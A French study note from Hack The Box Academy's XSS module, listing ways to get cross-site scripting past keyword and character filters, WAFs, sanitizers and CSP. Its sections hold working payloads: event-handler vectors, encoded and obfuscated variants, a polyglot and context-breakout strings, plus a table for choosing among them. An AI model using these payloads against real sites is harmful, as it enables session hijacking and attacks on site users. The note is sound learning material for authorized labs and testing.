---

titre: "XSS — Bypass & Filter Evasion (WAF, Sanitizers)"

plateforme: "Hack The Box Academy"

module: "Cross-Site Scripting (XSS)"

date: 2026-06-30

tags: [HTB, XSS, WebSec, FilterEvasion, WAFBypass, Sanitizer, Payloads, Notes]

---

  

# XSS — Bypass & Filter Evasion (WAF, Sanitizers)

  

> Complément offensif de [[XSS — Exfiltration de cookies (Session Hijacking)]].

> Dans les labs HTB, l'injection passait avec un simple `"><script>`. **En conditions réelles** (ou face à un bon sanitizer / WAF), il faut tout un arsenal de contournements. Cette note les recense.

  

---

  

## 0. Démarche : caractériser le filtre avant de bypasser

  

On ne « lance pas des payloads au hasard ». On **identifie d'abord ce qui est filtré**, exactement comme on identifie le contexte d'injection.

  

1. Soumettre un repère neutre : `test123` → voir où il atterrit (corps, attribut, JS, URL).

2. Soumettre des **caractères spéciaux isolés** : `<`, `>`, `"`, `'`, `/`, `(`, `)`, `` ` ``, `;`, `=`, espace.

3. Observer dans la **réponse** ce qui est : supprimé, échappé (`&lt;`), encodé, doublé, ou laissé tel quel.

4. En déduire le **type de filtre** :

  

| Type de filtre | Indice | Stratégie de bypass |

|---|---|---|

| Blacklist de **mots-clés** (`script`, `alert`, `onerror`…) | le mot disparaît, le reste passe | casse, doublement, encodage, alternatives |

| Blacklist de **caractères** (`<`, `>`, `"`…) | un caractère précis saute | encodage, contexte sans ce caractère |

| **Échappement HTML** (`htmlspecialchars`) | `<` → `&lt;` | viser un contexte non-HTML (attribut JS, `href`, etc.) |

| **WAF** (regex génériques) | blocage 403 / page « blocked » | obfuscation, fragmentation, encodage exotique |

| **CSP** (Content-Security-Policy) | le script ne s'exécute pas malgré injection réussie | bypass CSP (gadgets, JSONP, nonce…) |

| **DOM sink** filtré côté JS | dépend du sink (`innerHTML` vs `textContent`) | payloads sans `<script>` (innerHTML ne réexécute pas script) |

  

---

  

## 1. Bypass de casse (case-insensitive)

  

Si le filtre cherche littéralement `script` :

  

```html

<ScRiPt>alert(1)</sCrIpT>

<SCRIPT>alert(1)</SCRIPT>

<img src=x OnErRoR=alert(1)>

```

  

HTML est insensible à la casse pour les noms de balises/attributs → le navigateur exécute, le filtre (naïf) rate.

  

---

  

## 2. Doublement de balises (filtre non-récursif)

  

Un filtre qui **supprime une seule occurrence** de `<script>` sans reboucler :

  

```html

<scr<script>ipt>alert(1)</scr</script>ipt>

<scrip<script>t>alert(1)</scrip</script>t>

```

  

Après retrait du `<script>` interne, il reste un `<script>` valide. Même principe pour `<img>`, `javascript:` (`java<script>script:`), etc.

  

---

  

## 3. Sans `<script>` — balises + gestionnaires d'événements

  

Le plus utile en pratique (et **obligatoire** si le sink est `innerHTML`, qui ne réexécute pas les `<script>` injectés). On déclenche du JS via un **event handler** sur une balise « inoffensive » :

  

```html

<img src=x onerror=alert(document.cookie)>

<svg onload=alert(1)>

<svg/onload=alert(1)>

<body onload=alert(1)>

<iframe onload=alert(1)>

<input autofocus onfocus=alert(1)>

<select autofocus onfocus=alert(1)>

<textarea autofocus onfocus=alert(1)>

<keygen autofocus onfocus=alert(1)>

<video><source onerror=alert(1)>

<audio src=x onerror=alert(1)>

<details open ontoggle=alert(1)>

<marquee onstart=alert(1)>

<object data=x onerror=alert(1)>

<a href=# onmouseover=alert(1)>hover</a>

```

  

> `<img src=x onerror=...>` et `<svg onload=...>` sont les deux chevaux de bataille : courts, fiables, indépendants de `<script>`.

  

### Liste d'event handlers utiles

`onerror`, `onload`, `onfocus`, `onblur`, `onmouseover`, `onmouseenter`, `onclick`, `ontoggle`, `onstart`, `onanimationstart`, `ontransitionend`, `onpointerover`, `onpageshow`, `onbegin` (SMIL/SVG)…

  

```html

<style onload=alert(1)>

<x onpointerover=alert(1)>survole</x>

<svg><animate onbegin=alert(1) attributeName=x dur=1s>

```

  

---

  

## 4. Pseudo-protocole `javascript:`

  

Dans un contexte `href`/`src`/`action` (typiquement le champ **`url`/Website** d'un commentaire) :

  

```html

<a href="javascript:alert(document.cookie)">click</a>

<iframe src="javascript:alert(1)">

```

  

Variantes obfusquées si `javascript` est filtré :

  

```html

java&#115;cript:alert(1)         <!-- entité HTML pour 's' -->

java%0ascript:alert(1)           <!-- saut de ligne inséré -->

java&#x09;script:alert(1)        <!-- tabulation -->

JaVaScRiPt:alert(1)              <!-- casse -->

```

  

---

  

## 5. Contourner les blacklists de caractères

  

### Sans guillemets

Quand `"` et `'` sont filtrés (contexte attribut HTML qui tolère les valeurs non quotées) :

  

```html

<img src=x onerror=alert(document.cookie)>

<svg onload=alert`1`>            <!-- backtick = template literal, remplace () -->

```

  

### Sans parenthèses

Quand `(` `)` sont filtrés :

  

```html

<svg onload=alert`1`>                          <!-- template literals -->

<img src=x onerror="window.onerror=alert;throw 1">

<script>onerror=alert;throw 1337</script>

<script>{onerror=alert}throw 1</script>

```

  

### Sans espaces

Quand l'espace est filtré, on le remplace par `/`, tab (`%09`), newline (`%0a`), `%0c`, ou `/**/` :

  

```html

<img/src=x/onerror=alert(1)>

<svg/onload=alert(1)>

<img\tsrc=x\tonerror=alert(1)>     <!-- \t = tabulation réelle -->

```

  

### Sans slash `/`

```html

<svg onload=alert(1)>              <!-- pas besoin de balise fermante -->

```

  

---

  

## 6. Encodages & obfuscation

  

L'idée : faire passer un mot-clé filtré sous une forme que **le filtre ne reconnaît pas** mais que **le navigateur décode** à l'exécution.

  

### Entités HTML (contexte HTML)

```html

&lt;script&gt;alert(1)&lt;/script&gt;          <!-- si le filtre décode après check -->

<a href="javascript&colon;alert(1)">x</a>

<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">   <!-- alert en décimal -->

<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">  <!-- alert en hexa -->

```

  

### URL encoding (contexte URL / paramètre reflété)

```

%3Cscript%3Ealert(1)%3C/script%3E              <!-- simple -->

%253Cscript%253E                               <!-- double encoding : %25 = '%' -->

```

Le **double encoding** bat les WAF qui ne décodent qu'une fois.

  

### Unicode / échappements JS (contexte JavaScript)

```javascript

\u0061lert(1)                                  // 'a' en unicode → alert

eval('\x61\x6c\x65\x72\x74\x28\x31\x29')       // alert(1) en hexa

```

  

### `String.fromCharCode` (reconstruire une chaîne filtrée)

```javascript

eval(String.fromCharCode(97,108,101,114,116,40,49,41))   // alert(1)

```

  

### `atob` (base64 → exécution)

```javascript

eval(atob('YWxlcnQoMSk='))                     // 'alert(1)' en base64

<img src=x onerror="eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))">

```

  

### Accès indirect aux fonctions (mot `alert` filtré)

```javascript

window['alert'](1)

top['al'+'ert'](1)

self['ale'+'rt'](1)

this['ale'+'rt'](1)

(alert)(1)

[]['constructor']['constructor']('alert(1)')()   // via Function constructor

```

  

### JSFuck (obfuscation extrême — uniquement `[]()!+`)

```javascript

[][(![]+[])[+[]]...]   // 'alert(1)' encodé sans aucun alphanumérique

```

> Vu sur Root-Me (challenge *Stored XSS — Filter Bypass*). Illisible mais exécutable ; utile quand **tous** les caractères alphanumériques sont filtrés. Générateur : jsfuck.com.

  

---

  

## 7. Polyglottes (un payload, plusieurs contextes)

  

Conçu pour s'exécuter quel que soit le contexte d'injection (corps, attribut, JS, commentaire) :

  

```

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

```

(le célèbre polyglotte d'0xsobky / PortSwigger — à garder en référence, pas à mémoriser).

  

---

  

## 8. Bypass spécifiques au contexte d'injection

  

| Contexte de départ | Payload de breakout |

|---|---|

| Corps HTML | `<script>alert(1)</script>` ou `<img src=x onerror=alert(1)>` |

| Attribut double-quote | `"><script>alert(1)</script>` ou `" onmouseover="alert(1)` |

| Attribut single-quote | `'><script>alert(1)</script>` ou `' onmouseover='alert(1)` |

| Attribut sans quote | ` onmouseover=alert(1) ` |

| Dans `<script>var x='...'` | `';alert(1)//` ou `\';alert(1)//` |

| Dans `href`/`src` | `javascript:alert(1)` |

| Dans un commentaire HTML `<!-- ... -->` | `--><script>alert(1)</script>` |

| Dans `<textarea>`/`<title>` | `</textarea><script>alert(1)</script>` / `</title>...` |

  

> **Règle d'or** (déjà dans la note Fondamentaux) : *fermer* le contexte courant (attribut, balise, chaîne JS, commentaire) **avant** d'injecter son code.

  

---

  

## 9. Au-delà du sanitizer : CSP & gadgets

  

Un filtre peut laisser passer l'injection, mais la **Content-Security-Policy** empêcher l'exécution. Pistes de bypass CSP (avancé) :

  

- **Endpoints JSONP** autorisés dans la CSP → `?callback=alert(document.domain)`.

- **`unsafe-inline`** présent → les handlers inline passent.

- **Nonce/hash réutilisable** ou prévisible.

- **`base-uri` non restreint** → injection de `<base>` pour détourner les chemins relatifs.

- **Gadgets de frameworks** (Angular, etc.) → exécution via templates.

- **DOM clobbering** : injecter des éléments nommés (`<a id=x>`) pour écraser des variables JS et détourner la logique.

  

---

  

## 10. mXSS (Mutation XSS)

  

Le navigateur **re-sérialise** le HTML après parsing, transformant un payload « inerte » en payload exécutable après nettoyage par un sanitizer (DOMPurify historique). Exemple de concept : du contenu dans `<noscript>`, `<template>`, ou des attributs mal re-parsés qui « mutent » en code actif. Catégorie pointue mais à connaître pour les sanitizers réputés solides.

  

---

  

## 11. Tableau de décision rapide

  

| Ce qui est filtré | Essayer en priorité |

|---|---|

| `script` (mot) | casse, doublement `<scr<script>ipt>`, `<img onerror>`, `<svg onload>` |

| `<` ou `>` | contexte attribut (`" onmouseover=`), `javascript:` en `href` |

| `"` et `'` | valeurs non quotées, `alert`​`` `1` `` (backtick) |

| `(` `)` | `alert`​`` `1` ``, `onerror=alert;throw 1` |

| espace | `/`, `/**/`, tab `%09`, newline `%0a` |

| `alert` (mot) | `window['alert']`, `top['al'+'ert']`, `confirm`/`prompt`, `eval(atob())` |

| tout l'alphanumérique | JSFuck |

| échappement HTML (`&lt;`) | viser contexte JS/URL, double encoding `%253C` |

| WAF regex | double/triple encodage, fragmentation, polyglotte |

| CSP bloque l'exécution | JSONP, gadgets, DOM clobbering, `base-uri` |

  

---

  

## 12. Outils & références

  

- **PayloadsAllTheThings** → `XSS Injection/` : la référence de payloads classés par contexte.

- **XSStrike** → fuzzing + analyse de réflexion (lire `Efficiency` / `Confidence`) ; `--skip` pour ne pas s'arrêter, `| tee out.txt` pour logger.

- **PortSwigger XSS cheat sheet** → base d'event handlers et de vecteurs par navigateur (filtrable).

- **dalfox** → scanner XSS moderne (Go), bon pour l'automatisation paramétrique.

- **KNOXSS** → confirmation d'exécution (POC réel).

- **jsfuck.com**, **beautifier** pour encoder/décoder.

  

> ⚠️ **Cadre** : ces techniques s'emploient **uniquement** sur des cibles autorisées (labs HTB, programmes de bug bounty avec scope explicite type Yogosha, environnements de test perso). Hors périmètre = illégal.

  

---

  

## Liens

  

- [[Cross-Site Scripting (XSS) — Fondamentaux, Stored & Reflected]]

- [[XSS — Exfiltration de cookies (Session Hijacking)]]

- [[Outillage — WSL2, Exegol, VPN HTB & serveur d'exfiltration]]